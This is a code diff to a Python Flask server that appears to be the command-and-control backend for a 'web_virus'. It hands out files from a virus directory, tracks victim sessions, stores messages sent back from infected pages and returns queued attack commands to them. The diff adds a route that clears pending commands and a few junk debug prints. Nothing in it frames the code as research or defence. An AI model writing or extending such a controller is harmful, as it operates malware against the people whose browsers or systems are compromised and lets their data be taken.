@@ -134,14 +134,28 @@ def make_qr_code():
 def get_virus(file_name):
     return send_file("../virus/"+file_name, as_attachment=True)
 
+@app.route('/virus_clear_command/<path:attack_url>' , methods=['GET','POST'])
+def clear_token_command(attack_url):
+    if attack_url in url_list.keys():
+        if url_list.get(attack_url).attack_type == 'web_virus':
+            url_list.get(attack_url).attack_command = "none"
+            return 'ok'
+        else:
+            return 'your message error'
+
+    else:
+        return 'your message error'
+
 @app.route('/push/<attack_url>/<path:message>' , methods=['POST' , 'GET'])
 def get_message(attack_url,message):
 
     if attack_url in url_list.keys():
         if url_list.get(attack_url).attack_type == 'web_virus':
-            print("11: "+url_list.get(attack_url).attack_command)
+            print("1190234932-0: "+url_list.get(attack_url).attack_command)
             url_list.get(attack_url).message = unquote(message)
-            return url_list.get(attack_url).attack_command
+            send_command = url_list.get(attack_url).attack_command
+            # url_list.get(attack_url).attack_command = 'none'
+            return send_command
 
         url_list.get(attack_url).message = unquote(message)
         return 'ok'
@@ -225,11 +239,10 @@ def xhr_run(attack_url):
 def virus_run(attack_url , command):
     print(1)
     if attack_url in url_list.keys():
+        print("ufdlkaslkfjdlkfjljflkdsjdf")
         u: user_sessen = url_list.get(attack_url)
         # 返回u.message的值
         message_to_return = u.message
-        # 更新u.message为'none'
-        u.message = 'none'
         u.attack_command = command
         # 返回之前存储的消息
         return message_to_return
@@ -309,6 +322,7 @@ def attack(attack_type,user,pwd):
         u.username = user
 
         url_list[n] = u
+        print(attack_type)
         return n
 
     else:
